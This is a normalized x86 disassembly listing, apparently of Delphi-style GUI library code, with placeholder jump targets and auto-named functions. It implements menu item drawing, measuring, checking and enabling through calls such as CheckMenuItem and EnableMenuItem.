je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_3aa5e48
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_3aa5e94
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor eax eax
mov [ ebp - 0x24 ] eax
mov ebx [ ebp + 0x8 ]
add ebx 0xffffffe4
xor eax eax
push ebp
push sub_3aa6255
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
mov [ eax ] edx
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push 0x0
mov eax [ ebx ]
movzx eax [ eax + 0x3d ]
mov edx [ ebx ]
movzx edx [ edx + 0x39 ]
lea edx [ edx * 8 + rw-data ]
mov eax [ edx + eax * 4 ]
push eax
push 0xb
mov eax [ ebx ]
call sub_3aa3b48
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov eax [ eax + 0x30 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0xe12
mov eax [ ebx ]
movzx eax [ eax + 0x3d ]
mov edx [ ebx ]
movzx edx [ edx + 0x39 ]
lea edx [ edx * 8 + rw-data ]
mov eax [ edx + eax * 4 ]
push eax
push 0xb
mov eax [ ebx ]
call sub_3aa3b48
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
add [ edx ] eax
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push 0x0
push 0x0
push 0xd
mov eax [ ebx ]
call sub_3aa3b48
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
add [ eax ] edx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0xe11
push 0x0
push 0xd
mov eax [ ebx ]
call sub_3aa3b48
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx ] eax
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0xe11
push 0x1
push 0xe
mov eax [ ebx ]
call sub_3aa3b48
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push 0x0
push 0x1
push 0x10
mov eax [ ebx ]
call sub_3aa3b48
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
add [ eax ] edx
mov eax [ ebx ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
xor ecx ecx
mov edx 0x10
call sub_3a63a44
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x28 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push 0x0
push 0x0
push 0xf
mov eax [ ebx ]
call sub_3aa3b48
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0xe11
push 0x0
push 0xf
mov eax [ ebx ]
call sub_3aa3b48
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
add [ eax ] edx
mov eax [ ebx ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x40 ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x29 ] 0x0
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push 0x0
push 0x1
push 0x8
mov eax [ ebx ]
call sub_3aa3b48
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x29 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x29 ] al
jmp r-xdata
mov eax [ ebx ]
movzx esi [ eax + 0x60 ]
test si si
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffd0
mov edx [ ebx ]
mov edx [ edx + 0x30 ]
call sub_3a65338
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_3aa2bd4
mov ecx [ ebp - 0x24 ]
mov eax [ ebx ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffd0
call sub_3a655b8
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x29 ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x34 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x38 ]
mov eax [ ebx ]
call sub_3aa3e34
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa625c
lea eax [ ebp - 0x24 ]
call sub_3a652a0
retn
sub_3aa6267
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_3aa64c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
mov si 0xfff2
call sub_3a6457c
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov [ ebp - 0x21 ] 0x0
mov [ ebp - 0x21 ] 0x1
push ebp
call sub_3aa5e48
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call sub_3abdd24
mov dl 0x7
call sub_3abddec
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
call sub_3aa5e18
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
call sub_3aa6c54
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor edx edx
mov eax 0x6
call sub_3a6dbb4
test al al
je r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
push ebp
call sub_3aa5e94
pop ecx
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp [ eax + 0xa2 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa64cf
lea eax [ ebp - 0x3c ]
call sub_3a652a0
lea eax [ ebp - 0x30 ]
call sub_3a652a0
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
cmp [ ebp - 0x21 ] 0x0
jne r-xdata
cmp [ ebp - 0x21 ] 0x0
jne r-xdata
cmp [ ebp - 0x21 ] 0x0
jne r-xdata
cmp [ ebp - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
cmp [ ebp - 0x21 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x14 ]
xor ecx ecx
mov edx 0x10
call sub_3a63a44
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax [ ebp - 0x28 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov [ ebp - 0x29 ] 0x0
jmp r-xdata
mov [ ebp - 0x29 ] 0x0
mov eax [ ebp - 0x28 ]
movzx eax [ eax + 0x60 ]
mov [ ebp - 0x29 ] al
jmp r-xdata
mov eax [ ebp - 0x1c ]
movzx ebx [ eax + 0x60 ]
test bx bx
je r-xdata
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
mov edx [ edx + 0x30 ]
call sub_3a65338
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_3aa2bd4
mov ecx [ ebp - 0x3c ]
mov eax [ ebp - 0x1c ]
mov edx [ eax + 0x30 ]
lea eax [ ebp - 0x30 ]
call sub_3a655b8
jmp r-xdata
movzx eax [ ebp - 0x29 ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x34 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x1c ]
call sub_3aa3bd8
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
sub_3aa64f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_3a656c8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_3a652f4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_3aa6520
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_3aa6694
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_3aa66a4
cmp ebx eax
je r-xdata
movzx edx [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_3aa656c
sub_3aa656c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_3aa3b48
push eax
call CheckMenuItem
mov eax esi
call sub_3aa6520
sub_3aa65c0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_3aa6694
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_3aa3b48
push eax
call EnableMenuItem
sub_3aa6638
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_3aa69fc
mov edx eax
mov ecx ebx
mov eax edi
call sub_3aa3ae8
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_3aa6520
sub_3aa66a4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_3a7a494
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_3aa2b28
sub_3aa6714
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_3aa6694
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_3aa66fc
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_3aa6a30
mov ecx ebx
mov edx esi
mov eax edi
call sub_3aa6820
sub_3aa675c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3aa6694
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3aa66a4
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_3aa67b4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_3aa6694
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_3aa66a4
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_3aa66a4
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_3aa6820
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_3aa2b28
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx + 0x5c ] eax
movzx ecx [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_3aa3ae8
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_3a7a510
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_3aa6a9c
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_3aa6694
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_3aa3a18
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_3a7a494
movzx eax [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_3a7a494
movzx edx [ eax + 0x3f ]
mov eax esi
call sub_3aa6638
sub_3aa68d8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_3aa2b28
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_3aa6694
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_3aa3a18
mov eax ebx
call sub_3aa6694
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_3a7a494
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_3a7a388
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_3aa694c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
movzx edx [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_3aa656c
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_3aa667c
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_3aa667c
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_3aa6a14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3aa6694
mov edx eax
mov ecx esi
mov eax ebx
call sub_3aa6820
pop esi
pop ebx
retn
sub_3aa6a30
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_3aa69fc
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_3aa68d8
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_3aa2b28
sub_3aa6a58
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_3aa6a9c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_3aa6a9c
jmp r-xdata
mov eax ebx
call sub_3aa3a18
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_3aa8a20
sub_3aa6af4
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8e204
mov [ ebx + 0x4c ] eax
sub_3aa6b1c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_3a64380
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_3aa6db4
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_3a6457c
mov edx ebx
mov eax edi
call sub_3a83738
mov eax ebx
mov si 0xffee
call sub_3a6457c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_3aa6b8c
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8e204
mov [ esi + 0x4c ] eax
sub_3aa6bc0
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_3aa6694
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_3aa66a4
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_3aa6c00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_3aa6a30
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_3aa6a14
jmp r-xdata
mov edx ebx
mov eax esi
call sub_3aa6a14
sub_3aa6c64
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_3aa6520
sub_3aa6c90
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
movzx eax [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_3aa64f8
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x69 ]
mov eax esi
call sub_3aa656c
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x6a ]
mov eax esi
call sub_3aa65c0
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_3a652f4
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_3aa66ec
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
movzx edx [ edi + 0x6c ]
mov eax esi
call sub_3aa6638
cmp [ esi + 0x3f ] 0x0
jne r-xdata
movzx edx [ edi + 0x84 ]
mov eax esi
call sub_3aa66c8
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x86 ]
mov eax esi
call sub_3aa66dc
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_3aa6db4
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_3aa667c
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_3a6457c
sub_3aa6dd8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3aa6df8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
